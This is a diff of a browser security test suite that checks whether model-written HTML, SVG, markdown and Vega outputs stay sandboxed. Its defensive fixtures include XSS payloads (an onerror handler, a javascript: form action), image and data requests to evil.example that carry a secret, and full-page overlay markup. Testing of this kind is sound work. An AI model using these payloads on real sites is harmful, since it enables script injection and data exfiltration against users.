@@ -1,13 +1,14 @@
-// What model- or corpus-written output can do in a real browser (components/Outputs.tsx, chat/markdown.tsx), the half
-// of tests/public/security.test.tsx that jsdom cannot show: the browser's own sandbox and what it fetches. A scripted
-// html output runs in a frame that cannot reach the page, and what it posts to the API leaves as `Origin: null`, which
-// the backend's Origin check refuses; inlined html or svg runs no script and loads nothing from another host; a
-// markdown image from another host is drawn as its alt text; a Vega chart fetches no URL but a data: one. Every request
-// the page and its frames make is recorded, and any to another host fails the check.
+// What model- or corpus-written output can do in a real browser (components/Outputs.tsx), the half of
+// tests/public/security.test.tsx that jsdom cannot show: the browser's own sandbox, layout and what it fetches. A
+// scripted html output runs in a frame that cannot reach the page, and what it posts to the API leaves as `Origin:
+// null`, which the backend's Origin check refuses; inlined html or svg runs no script, loads nothing from another host
+// and cannot draw over the page. Every request the page and its frames make is recorded, and any to another host fails
+// the check.
 import assert from 'node:assert/strict'
 import { afterAll, beforeAll, test } from 'vitest'
 import type { Browser, Page } from 'playwright'
-import { bundle, cleanup, launch, ORIGIN, src } from './page.ts'
+import { readFileSync } from 'node:fs'
+import { bundle, cleanup, FRONTEND, launch, ORIGIN, src } from './page.ts'
 
 let browser: Browser
 let page: Page
@@ -21,9 +22,8 @@ beforeAll(async () => {
     `import { createRoot } from 'react-dom/client'`,
     `import { flushSync } from 'react-dom'`,
     `import { Output } from '${src('components/Outputs.tsx')}'`,
-    `import { ChatMarkdown } from '${src('chat/markdown.tsx')}'`,
     `const mount = (node) => { const el = document.createElement('div'); el.style.width = '640px'; el.id = 'm' + Math.random().toString(36).slice(2); document.body.appendChild(el); flushSync(() => createRoot(el).render(node)); return el.id }`,
-    `window.__t = { output: (bundle) => mount(<Output bundle={bundle} />), chat: (text) => mount(<ChatMarkdown text={text} />) }`,
+    `window.__t = { output: (bundle) => mount(<Output bundle={bundle} />) }`,
   ])
   browser = await launch()
   page = await browser.newPage()
@@ -92,16 +92,18 @@ test('an inlined html output runs no script, keeps no style or form, and loads n
   await settle()
   const seen = await page.evaluate((id) => {
     const el = document.getElementById(id)!
-    el.querySelector<HTMLElement>('#js')?.click()
+    // an output's ids are prefixed, so none is the app's
+    const q = (name: string) => el.querySelector<HTMLElement>(`#user-content-${name}`)
+    q('js')?.click()
     return {
       table: !!el.querySelector('table td'),
       styles: document.querySelectorAll('style').length,
       form: !!el.querySelector('form, button'),
-      leak: !!el.querySelector('#leak')?.getAttribute('src'),
-      bgStyle: el.querySelector('#bg')?.getAttribute('style') ?? null,
-      jsHref: el.querySelector('#js')?.getAttribute('href') ?? null,
-      ext: [el.querySelector('#ext')?.getAttribute('target'), el.querySelector('#ext')?.getAttribute('rel')],
-      local: !!el.querySelector('#local')?.getAttribute('src'),
+      leak: !!q('leak')?.getAttribute('src'),
+      bgStyle: q('bg')?.getAttribute('style') ?? null,
+      jsHref: q('js')?.getAttribute('href') ?? null,
+      ext: [q('ext')?.getAttribute('target'), q('ext')?.getAttribute('rel')],
+      local: !!q('local')?.getAttribute('src'),
       iframe: !!el.querySelector('iframe'),
     }
   }, id)
@@ -111,70 +113,45 @@ test('an inlined html output runs no script, keeps no style or form, and loads n
   assert.deepEqual(leaks(), [])
 })
 
-test('an svg figure keeps its drawing, runs nothing and loads nothing from another host', async () => {
-  const svg = `<?xml version="1.0" encoding="utf-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100pt" height="50pt" viewBox="0 0 100 50">
- <defs><style type="text/css">*{stroke-linejoin: round; stroke-linecap: butt} body { display: none }</style></defs>
- <div xmlns="http://www.w3.org/1999/xhtml"><xmp><![CDATA[</xmp><img src="x" onerror="window.__pwned = 'xmp'">]]></xmp><form action="javascript:window.__pwned = 'form'"><button id="svgbtn">b</button></form></div>
- <g id="figure_1"><path id="p1" d="M 0 0 L 10 10" style="stroke: #000000"/></g>
- <image xlink:href="https://evil.example/svg.png" width="5" height="5"/>
- <image id="embedded" xlink:href="data:image/png;base64,iVBORw0KGgo=" width="5" height="5"/>
+/** The outputs' stylesheet, for the output's box, until the returned function removes it (other checks count the page's
+ * style elements). */
+async function outputsCss(): Promise<() => Promise<void>> {
+  const sheet = await page.addStyleTag({ content: readFileSync(`${FRONTEND}/src/styles/outputs.css`, 'utf8') })
+  return async () => { await sheet.evaluate((node) => node.parentNode?.removeChild(node)) }
+}
+
+test('an inlined html output cannot draw over the page', async () => {
+  const id = await output({ 'text/html': '<div class="chat-perm" style="position: fixed; inset: 0; z-index: 2147483647; background: red; transform: translate(0, 0)">cover</div>' })
+  const done = await outputsCss()
+  await settle()
+  const covered = await page.evaluate((id) => {
+    const top = document.elementFromPoint(innerWidth - 2, innerHeight - 2)
+    return !!top && document.getElementById(id)!.contains(top)
+  }, id)
+  await done()
+  assert.equal(covered, false)
+})
+
+test('an svg figure cannot draw over the page', async () => {
+  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="100pt" height="50pt" viewBox="0 0 100 50" overflow="visible" style="z-index: 2147483647; transform: translate(0, 0); stroke-linecap: butt">
+ <rect x="-5000" y="-5000" width="10000" height="10000" fill="red"/>
 </svg>`
   const id = await output({ 'image/svg+xml': svg })
+  const done = await outputsCss()
   await settle()
-  const seen = await page.evaluate((id) => {
-    const el = document.getElementById(id)!
-    el.querySelector<HTMLElement>('#svgbtn')?.click()
-    const root = el.querySelector('svg')
+  const got = await page.evaluate((id) => {
+    const fig = document.getElementById(id)!.querySelector('svg')!
+    const box = fig.parentElement!.getBoundingClientRect()
+    const mine = (x: number, y: number) => {
+      const top = document.elementFromPoint(x, y)
+      return !!top && fig.contains(top)
+    }
     return {
-      path: !!el.querySelector('path'),
-      styles: document.querySelectorAll('style').length,
-      html: !!el.querySelector('xmp, form, button, img') || !!root?.querySelector('div'),
-      rootStyle: root?.getAttribute('style') ?? '',
-      images: Array.from(el.querySelectorAll('image')).map((i) => (i.getAttribute('href') ?? i.getAttribute('xlink:href') ?? '').slice(0, 10)),
+      corner: mine(innerWidth - 2, innerHeight - 2),
+      beside: mine(box.right + 20, box.top + 10),
+      inside: mine(box.left + 10, box.top + 10),
     }
   }, id)
-  await settle(200)
-  assert.equal(await pwned(), null)
-  // the remote image keeps its element with no address; the embedded one keeps its data: URL
-  assert.deepEqual({ ...seen, rootStyle: /stroke-linejoin: round; stroke-linecap: butt/.test(seen.rootStyle), images: seen.images.filter(Boolean) }, { path: true, styles: 0, html: false, rootStyle: true, images: ['data:image'] })
-  assert.deepEqual(leaks(), [])
-})
-
-test('a markdown image from another host is its alt text, in an output and in the chat', async () => {
-  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/mini/media/a.png)'
-  for (const where of ['output', 'chat']) {
-    const id = where === 'output' ? await output({ 'text/markdown': md }) : await page.evaluate((text) => (window as any).__t.chat(text), md)
-    await settle(200)
-    const seen = await page.evaluate((id) => {
-      const el = document.getElementById(id)!
-      return { srcs: Array.from(el.querySelectorAll('img')).map((i) => (i.getAttribute('src') ?? '').slice(0, 10)), text: el.textContent ?? '' }
-    }, id)
-    assert.deepEqual(seen.srcs, ['/api/ws/mi'], where)
-    assert.match(seen.text, /leak/, where)
-  }
-  assert.deepEqual(leaks(), [])
-})
-
-test('a Vega chart fetches no URL but a data: one, and a spec cannot hand it a loader of its own', async () => {
-  const enc = { x: { field: 'a', type: 'nominal' }, y: { field: 'b', type: 'quantitative' } }
-  const remote = {
-    $schema: 'https://vega.github.io/schema/vega-lite/v5.json',
-    data: { url: 'https://evil.example/data.json' },
-    mark: 'bar',
-    encoding: enc,
-    usermeta: { embedOptions: { loader: { baseURL: 'https://evil.example/' }, config: 'https://evil.example/config.json' } },
-  }
-  const viaData = { $schema: 'https://vega.github.io/schema/vega-lite/v5.json', data: { url: 'data:application/json,' + encodeURIComponent('[{"a":"x","b":2},{"a":"y","b":3}]'), format: { type: 'json' } }, mark: 'bar', encoding: enc }
-  const idRemote = await output({ 'application/vnd.vegalite.v5+json': remote })
-  const idData = await output({ 'application/vnd.vegalite.v5+json': viaData })
-  let bars = 0
-  for (let i = 0; i < 50 && !bars; i++) {
-    await settle(100)
-    bars = await page.evaluate((id) => document.querySelectorAll(`#${id} .mark-rect path`).length, idData)
-  }
-  await settle(300)
-  assert.equal(bars, 2, 'a chart whose data is a data: URL draws')
-  assert.ok(await page.evaluate((id) => !!document.getElementById(id), idRemote))
-  assert.deepEqual(leaks(), [])
+  await done()
+  assert.deepEqual(got, { corner: false, beside: false, inside: true })
 })
